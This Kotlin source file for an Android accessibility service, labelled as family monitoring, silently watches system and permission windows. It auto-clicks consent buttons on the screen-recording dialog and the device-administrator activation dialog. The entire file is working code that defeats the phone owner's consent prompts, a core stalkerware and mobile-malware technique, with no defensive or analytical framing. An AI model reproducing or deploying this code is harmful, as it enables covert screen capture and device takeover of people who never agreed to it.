package com.example.family_monitor

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class SilentAccessibilityService : AccessibilityService() {

    private val SYSTEM_PKGS = setOf(
        "android", "com.android.systemui",
        "com.android.settings", "com.android.permissioncontroller"
    )

    override fun onServiceConnected() {
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
            notificationTimeout = 50
            packageNames = null   // watch ALL packages so we never miss the dialog
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: return
        if (pkg !in SYSTEM_PKGS) return
        val root = rootInActiveWindow ?: return
        try {
            val text = collectAllText(root).lowercase()
            when {
                isMediaProjectionDialog(text) ->
                    clickButton(root, listOf("start now", "start", "allow"))
                isDeviceAdminDialog(text) ->
                    clickButton(root, listOf("activate", "activate device administrator", "ok"))
            }
        } catch (_: Exception) {
        } finally {
            root.recycle()
        }
    }

    private fun isMediaProjectionDialog(t: String) =
        t.contains("capturing") || t.contains("recording your screen") ||
        t.contains("cast your screen") || t.contains("start capturing") ||
        t.contains("screen capture") || t.contains("screen recording")

    private fun isDeviceAdminDialog(t: String) =
        t.contains("device admin") || t.contains("activate device") ||
        t.contains("device administrator")

    private fun collectAllText(node: AccessibilityNodeInfo): String {
        val sb = StringBuilder()
        node.text?.let { sb.append(' ').append(it) }
        node.contentDescription?.let { sb.append(' ').append(it) }
        for (i in 0 until node.childCount) {
            node.getChild(i)?.let { child ->
                try { sb.append(collectAllText(child)) } finally { child.recycle() }
            }
        }
        return sb.toString()
    }

    private fun clickButton(node: AccessibilityNodeInfo, targets: List<String>): Boolean {
        val t = node.text?.toString()?.lowercase()?.trim()
        val d = node.contentDescription?.toString()?.lowercase()?.trim()
        if (targets.any { t == it || d == it }) {
            if (node.isClickable) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                return true
            }
            val p = node.parent
            if (p?.isClickable == true) {
                p.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                p.recycle(); return true
            }
            p?.recycle()
        }
        for (i in 0 until node.childCount) {
            node.getChild(i)?.let { child ->
                try { if (clickButton(child, targets)) return true } finally { child.recycle() }
            }
        }
        return false
    }

    override fun onInterrupt() {}
}
